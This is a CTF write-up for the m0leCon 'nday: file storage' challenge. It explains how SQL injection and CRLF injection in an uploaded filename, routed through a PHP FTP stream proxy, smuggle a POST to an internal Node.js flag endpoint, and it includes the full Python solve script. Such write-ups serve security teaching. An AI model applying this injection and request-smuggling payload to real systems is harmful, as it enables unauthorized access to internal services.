---
title: "nday: file storage - m0leCon Teaser CTF"
date: "11 September 2024"
category: "CTF"
tags: ["CRLF", "SQLi"]
excerpt: "Exploit write-up: SQLi + CRLF in a PHP FTP stream to trigger an internal POST and exfiltrate the flag; includes the solve script."
---

This write-up covers a challenge from the m0leCon Teaser CTF. The goal was to combine SQL Injection (SQLi) and CRLF (Carriage Return Line Feed) injection to retrieve a flag from an internal service. The setup included three services: an FTP server, a Node.js application, and a PHP application served by Nginx.

## Services

### FTP
The FTP service uses vsftpd:

```dockerfile
COPY vsftpd.conf /etc/vsftpd/vsftpd.conf
```

### Node.js

The Node.js app exposes a route that returns the flag when a request contains an `x-get-flag` header:

```javascript
app.post("/flag", (req, res) => {
  if (!!req.headers["x-get-flag"]) {
    res.send(process.env.FLAG || "ptm{REDACTED}");
  } else {
    res.send("nope");
  }
});
```

There is also a `/create-user` route to create users. The objective is to send a POST to `/flag` including an `x-get-flag` header.

### PHP

- Registration requires completing a Proof of Work (PoW).
- Users can upload and download files.

The PHP application fetches files from the FTP service using PHP's FTP stream wrapper:

```php
$ftp = @fopen("ftp://{$_SESSION['user']}:{$_SESSION['password']}@ftp/$filename", 'r', false, $context);
```

This retrieves the file and forwards it in the response.

## Vulnerabilities

### SQL Injection
In php/www/components/file_manager.php:

```php
$stmt = $database->prepare("INSERT INTO files (owner, filename, size) VALUES (:owner, '$filename', :size)");
```

The `filename` is interpolated directly into the SQL query, enabling SQLi via `filename`.

### CRLF Injection
The same `filename` is used in a header without sufficient sanitization:

```php
header('Content-Disposition: attachment; filename="' . urlencode($filename) . '"');
```

This allows CRLF injection via `filename`, which can be combined with the FTP stream context to craft HTTP requests.

## Exploit Overview

- The application stores session-controlled settings into a stream context:
  ```php
  $opts = ['ftp' => $_SESSION['settings']];
  $context = stream_context_create($opts);
  ```
- When a user posts `settings`, the JSON is decoded into `$_SESSION['settings']`:
  ```php
  if (isset($_POST['settings'])) {
      $data = json_decode($_POST['settings'], true);
      if (!is_array($data)) {
          die;
      }
      $_SESSION['settings'] = $data;
  }
  ```
- PHP's FTP stream context supports a `proxy` option. By controlling the proxy and crafting a filename containing CRLFs, it is possible to make the FTP stream issue an HTTP request to the internal Node.js service and include a header (`x-get-flag`) that causes the app to return the flag.

## Solve Script

Below is the solve script used for this challenge:

```python
import requests
import urllib

url = "http://localhost:8080"
name = "x HTTP/1.1\r\nHost: ftp\r\n\r\n\r\nPOST /flag HTTP/1.1\r\nx-get-flag:"
data = f"'||(SELECT x'{name.encode().hex()}')||'"

file = {'file': (data, "")}
sess = {"PHPSESSID": "21n3bc7elm25b7r7lml2r7neq1"}

if requests.post(url, files=file, cookies=sess).status_code == 200:
    conf = {'settings': '{"proxy": "tcp://ftp:3000"}'}
    if requests.post(url, data=conf, cookies=sess).status_code == 200:
        res = requests.get(url + f"?filename={urllib.parse.quote(name)}", cookies=sess)
        print(f"Flag: {res.content}")
else:
    print("Failed!")
```

Notes:
- The exploit uses SQLi to inject a payload into `filename`.
- The payload encodes CRLF and an HTTP request which is routed through the FTP stream proxy to the internal Node.js service, triggering the flag response.